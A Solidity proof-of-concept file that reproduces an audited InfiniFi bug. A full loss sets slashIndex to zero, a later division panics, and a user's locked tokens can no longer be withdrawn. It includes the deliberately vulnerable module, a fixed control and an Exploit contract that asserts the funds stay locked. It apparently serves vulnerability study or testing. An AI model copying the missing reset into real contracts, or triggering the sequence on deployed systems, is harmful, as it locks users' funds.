// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  InfiniFi — Lock of user funds due to zero slashIndex update
    (Spearbit, R0bert, finding 55055, March 2025).

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: UnwindingModule.applyLosses writes
        slashIndex = slashIndex.mulDivDown(remaining, previous)
    and never restores it. A loss that burns every receipt in the unwinding
    bucket stores slashIndex = 0. LockingController.withdraw then calls
    startUnwinding, whose verbatim line

        uint256 rewardWeight = _rewardWeight.divWadDown(slashIndex);

    divides by zero and panics. The user's locked receipts stay in the
    controller. The control resets slashIndex to 1e18 when the bucket hits
    zero, and the same withdraw pays the user N.

    Verbatim line preserved from the Spearbit report (UnwindingModule.startUnwinding).
    Surrounding global-point accounting is reduced; the division and the missing
    reset are the audited behavior. */

function divWadDown(uint256 x, uint256 y) pure returns (uint256) {
    // @> VULN: slashIndex stays 0 after a full burn, so this division panics and withdraw never pays
    return (x * 1e18) / y;
}

function mulDivDown(uint256 x, uint256 y, uint256 d) pure returns (uint256) {
    return (x * y) / d;
}

using {divWadDown, mulDivDown} for uint256;

interface IUnwinding {
    function slashIndex() external view returns (uint256);
    function totalReceiptTokens() external view returns (uint256);
    function applyLosses(uint256 _amount) external;
    function syncDeposits(uint256 amount) external;
    function startUnwinding(address _user, uint256 _receiptTokens, uint32 _unwindingEpochs, uint256 _rewardWeight)
        external;
}

contract ReceiptToken {
    string public constant name = "InfiniFi Receipt";
    string public constant symbol = "iUSD";
    uint8 public constant decimals = 18;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

/// @dev Vulnerable UnwindingModule. applyLosses is the audited formula and does
/// not reset slashIndex. startUnwinding keeps the blamed division verbatim.
contract UnwindingModule {
    ReceiptToken public immutable receipt;
    uint256 public slashIndex = 1e18;
    uint256 public totalReceiptTokens;
    uint256 public lastRewardWeight;

    constructor(ReceiptToken _receipt) {
        receipt = _receipt;
    }

    function syncDeposits(uint256 amount) external {
        totalReceiptTokens = amount;
    }

    function applyLosses(uint256 _amount) external {
        if (_amount == 0) return;
        uint256 _totalReceiptTokens = totalReceiptTokens;
        receipt.burn(_amount);
        slashIndex = slashIndex.mulDivDown(_totalReceiptTokens - _amount, _totalReceiptTokens);
        totalReceiptTokens = _totalReceiptTokens - _amount;
        // FIX: if (totalReceiptTokens == 0) slashIndex = 1e18;
    }

    function startUnwinding(address _user, uint256 _receiptTokens, uint32 _unwindingEpochs, uint256 _rewardWeight)
        external
    {
        // Report line, inlined by via IR into divWadDown above.
        uint256 rewardWeight = _rewardWeight.divWadDown(slashIndex);
        lastRewardWeight = rewardWeight;
        // silence unused-parameter reduction of the real global-point tail
        if (_unwindingEpochs == 0 && _receiptTokens == 0 && _user == address(0)) lastRewardWeight = 0;
    }
}

/// @dev Control: same division, but a wiped bucket restores slashIndex to 1e18.
contract UnwindingModuleFixed {
    ReceiptToken public immutable receipt;
    uint256 public slashIndex = 1e18;
    uint256 public totalReceiptTokens;
    uint256 public lastRewardWeight;

    constructor(ReceiptToken _receipt) {
        receipt = _receipt;
    }

    function syncDeposits(uint256 amount) external {
        totalReceiptTokens = amount;
    }

    function applyLosses(uint256 _amount) external {
        if (_amount == 0) return;
        uint256 _totalReceiptTokens = totalReceiptTokens;
        receipt.burn(_amount);
        slashIndex = slashIndex.mulDivDown(_totalReceiptTokens - _amount, _totalReceiptTokens);
        totalReceiptTokens = _totalReceiptTokens - _amount;
        if (totalReceiptTokens == 0) {
            slashIndex = 1e18;
        }
    }

    function startUnwinding(address _user, uint256 _receiptTokens, uint32 _unwindingEpochs, uint256 _rewardWeight)
        external
    {
        uint256 rewardWeight = _rewardWeight.divWadDown(slashIndex);
        lastRewardWeight = rewardWeight;
        if (_unwindingEpochs == 0 && _receiptTokens == 0 && _user == address(0)) lastRewardWeight = 0;
    }
}

contract LockingController {
    ReceiptToken public immutable receipt;
    IUnwinding public immutable module;
    mapping(address => uint256) public lockedOf;
    mapping(address => uint256) public rewardWeightOf;

    constructor(ReceiptToken _receipt, IUnwinding _module) {
        receipt = _receipt;
        module = _module;
    }

    function lock(uint256 amount) external {
        receipt.transferFrom(msg.sender, address(this), amount);
        lockedOf[msg.sender] += amount;
        rewardWeightOf[msg.sender] += amount;
    }

    function withdraw(address account) external returns (uint256 paid) {
        uint256 shares = lockedOf[account];
        uint256 weight = rewardWeightOf[account];
        module.startUnwinding(account, shares, 1, weight);
        lockedOf[account] = 0;
        receipt.transfer(account, shares);
        paid = shares;
    }
}

contract User {
    ReceiptToken public immutable token;

    constructor(ReceiptToken _token) {
        token = _token;
    }

    function deposit(LockingController locker, uint256 amount) external {
        token.approve(address(locker), amount);
        locker.lock(amount);
    }
}

contract Exploit {
    uint256 public constant LOCKED = 1000 ether;
    uint256 public constant BUCKET = 250 ether;

    ReceiptToken public receipt;
    UnwindingModule public module;
    LockingController public locker;
    User public user;

    uint256 public slashIndexAfter;
    uint256 public paidOut;
    uint256 public heldAfter;
    uint256 public userBalanceAfter;
    bool public withdrew;

    constructor() {
        receipt = new ReceiptToken();
        module = new UnwindingModule(receipt);
        locker = new LockingController(receipt, IUnwinding(address(module)));
        user = new User(receipt);
    }

    function run() external {
        this.seedBucket();
        this.lockUser();
        this.slashAll();
        this.readIndex();
        this.attemptWithdraw();
        this.assertHarm();
    }

    function seedBucket() external {
        receipt.mint(address(module), BUCKET);
        module.syncDeposits(BUCKET);
    }

    function lockUser() external {
        receipt.mint(address(user), LOCKED);
        user.deposit(locker, LOCKED);
    }

    function slashAll() external {
        module.applyLosses(BUCKET);
    }

    function readIndex() external {
        slashIndexAfter = module.slashIndex();
    }

    function attemptWithdraw() external {
        try locker.withdraw(address(user)) returns (uint256 paid) {
            paidOut = paid;
            withdrew = true;
        } catch {
            paidOut = 0;
            withdrew = false;
        }
    }

    function assertHarm() external {
        slashIndexAfter = module.slashIndex();
        heldAfter = receipt.balanceOf(address(locker));
        userBalanceAfter = receipt.balanceOf(address(user));
        require(slashIndexAfter == 0, "slashIndex not zero");
        require(withdrew == false, "withdraw did not revert");
        require(paidOut == 0, "withdraw paid");
        require(heldAfter == LOCKED, "locker does not hold N");
        require(userBalanceAfter == 0, "user was paid");
    }
}
